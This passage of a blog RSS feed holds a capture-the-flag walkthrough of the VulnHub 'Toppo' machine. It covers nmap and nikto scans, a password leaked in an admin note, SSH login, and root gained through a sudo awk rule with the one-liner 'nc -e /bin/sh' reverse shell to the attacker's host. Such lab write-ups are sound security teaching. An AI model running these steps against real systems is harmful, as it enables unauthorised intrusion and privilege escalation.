-50394/tcp open  status  1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100024)&lt;/span&gt;
-MAC Address: 08:00:27:C5:CA:47 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.9
-Uptime guess: 0.010 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Thu Jul 12 12:23:50 2018&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Network Distance: 1 hop
-TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;261 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-IP ID Sequence Generation: All zeros
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE
-HOP RTT     ADDRESS
-1   0.46 ms 10.0.0.6
-
-NSE: Script Post-scanning.
-Initiating NSE at 12:38
-Completed NSE at 12:38, 0.00s elapsed
-Initiating NSE at 12:38
-Completed NSE at 12:38, 0.00s elapsed
-Read data files from: /usr/bin/../share/nmap
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;18.17 seconds
-           Raw packets sent: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65550 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;From here I can see only one service that’s worth looking at the start, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; running on port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt;. While looking manually at the website, I decided to run &lt;code class=&quot;highlighter-rouge&quot;&gt;nikto&lt;/code&gt; to scan the website.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.0.6
-- Nikto v2.1.6
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
-+ Target IP:          10.0.0.6
-+ Target Hostname:    10.0.0.6
-+ Target Port:        80
-+ Start Time:         2018-07-12 12:20:26 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
-+ Server: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-+ Server leaks inodes via ETags, header found with file /, fields: 0x1925 0x563f5cf714e80 
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
-+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
-+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-+ Apache/2.4.10 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
-+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
-+ OSVDB-3268: /admin/: Directory indexing found.
-+ OSVDB-3092: /admin/: This might be interesting...
-+ OSVDB-3268: /img/: Directory indexing found.
-+ OSVDB-3092: /img/: This might be interesting...
-+ OSVDB-3268: /mail/: Directory indexing found.
-+ OSVDB-3092: /mail/: This might be interesting...
-+ OSVDB-3092: /manual/: Web server manual found.
-+ OSVDB-3268: /manual/images/: Directory indexing found.
-+ OSVDB-3233: /icons/README: Apache default file found.
-+ 7517 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 15 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
-+ End Time:           2018-07-12 12:20:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;27 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we have, an &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin/&lt;/code&gt; directory. Inside there was a note in &lt;code class=&quot;highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt; file.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;URL OF NOTE: http://10.0.0.6/admin/notes.txt
-
-Note to myself :
-
-I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;At first I thought about enumerating more in order to find the username, as we already have the password. But stupid me overthought this part way too much.&lt;/p&gt;
-
-&lt;p&gt;I didn’t notice that the username is already &lt;strong&gt;&lt;em&gt;in the password&lt;/em&gt;&lt;/strong&gt;. Like what was I thinking, &lt;code class=&quot;highlighter-rouge&quot;&gt;ted&lt;/code&gt; can be the username, and it probably will as this is easy machine.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh ted@10.0.0.6
-ted@10.0.0.6&lt;span class=&quot;s1&quot;&gt;'s password: 
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Apr 15 12:33:00 2018 from 192.168.0.29
-
-ted@Toppo:~$ ls -la
-total 24
-drwxr-xr-x 2 ted  ted  4096 Jul 16 12:55 .
-drwxr-xr-x 3 root root 4096 Apr 15 10:08 ..
--rw------- 1 ted  ted     1 Apr 15 12:33 .bash_history
--rw-r--r-- 1 ted  ted   220 Apr 15 10:08 .bash_logout
--rw-r--r-- 1 ted  ted  3515 Apr 15 10:08 .bashrc
--rw-r--r-- 1 ted  ted   675 Apr 15 10:08 .profile&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Of course that the password works. Now we have to escalate our privilages. Here comes good old &lt;a href=&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&quot;&gt;G0tm1k post&lt;/a&gt; and while trying different steps I’ve noticed this entry in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/sudoers
-ted &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/awk&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now I decided to check whether &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; is installed on the system.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which nc
-/bin/nc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And now we can use simple &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function from &lt;code class=&quot;highlighter-rouge&quot;&gt;awk&lt;/code&gt; in order to run the reverse shell with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ted@Toppo:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'BEGIN {system(&quot;nc -e /bin/sh 10.0.0.4 1337&quot;)}'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can look at the ouputu of the previously started listener.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 1337
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1337 ...
-10.0.0.6: inverse host lookup failed: Unknown host
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.6] 52985
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
-total 24
-drwx------  2 root root 4096 Apr 15 11:40 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-drwxr-xr-x 21 root root 4096 Apr 15 10:02 ..
-&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;  1 root root   53 Apr 15 12:28 .bash_history
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  570 Jan 31  2010 .bashrc
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  397 Apr 15 10:19 flag.txt
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  140 Nov 19  2007 .profile
-&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
-_________                                  
-|  _   _  |                                 
-|_/ | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|.--.   _ .--.   _ .--.    .--.   
-    | |  / .&lt;span class=&quot;s1&quot;&gt;'`\ \[ '&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;'`\ \[ '&lt;/span&gt;/&lt;span class=&quot;s1&quot;&gt;'`\ \/ .'&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;
-   _| |_ | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_. | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ | | &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/ &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_. | 
-  |_____| &lt;span class=&quot;s1&quot;&gt;'.__.'&lt;/span&gt;  | &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;.__/  | &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;.__/  &lt;span class=&quot;s1&quot;&gt;'.__.'&lt;/span&gt;  
-                 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;__|     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;__|              
-
-Congratulations &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; there is your flag : 0wnedlab&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;p4ssi0n_c0me_with_pract1ce&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-</description>
-        <pubDate>Mon, 16 Jul 2018 02:00:00 +0200</pubDate>
-        <link>http://localhost:4000/vulnhub-toppo/</link>
-        <guid isPermaLink="true">http://localhost:4000/vulnhub-toppo/</guid>
       </item>
     
   </channel>
